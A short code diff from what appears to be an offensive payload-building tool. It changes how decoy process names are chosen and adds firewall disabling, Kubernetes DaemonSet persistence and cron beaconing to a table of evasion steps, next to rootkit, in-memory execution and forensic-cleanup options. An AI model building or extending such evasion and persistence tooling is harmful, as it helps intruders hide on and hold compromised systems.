@@ -112,7 +112,7 @@ def build_manifest(
         if evasion_set & {"memfd_exec", "ld_preload_rootkit", "forensics_cleanup"}:
             import hashlib as _hl
             op_seed = variables.get("operation_id", payload_id)
-            decoy_idx = int(_hl.md5(op_seed.encode()).hexdigest(), 16) % len(decoy_names)
+            decoy_idx = int(_hl.sha256(op_seed.encode()).hexdigest(), 16) % len(decoy_names)
             decoy = decoy_names[decoy_idx]
             variables.setdefault("memfd_name", decoy)
             variables.setdefault("process_name", decoy)
@@ -192,6 +192,9 @@ _EVASION_POSITION = {
     "systemd_timer": "persist",
     "forensics_cleanup": "final",
     "cleanup": "final",
+    "firewall_disable": "prepend",
+    "k8s_daemonset": "persist",
+    "cron_beacon": "persist",
 }
 
 # Sort order within the ``append`` group. Lower numbers run first. Strip (1)
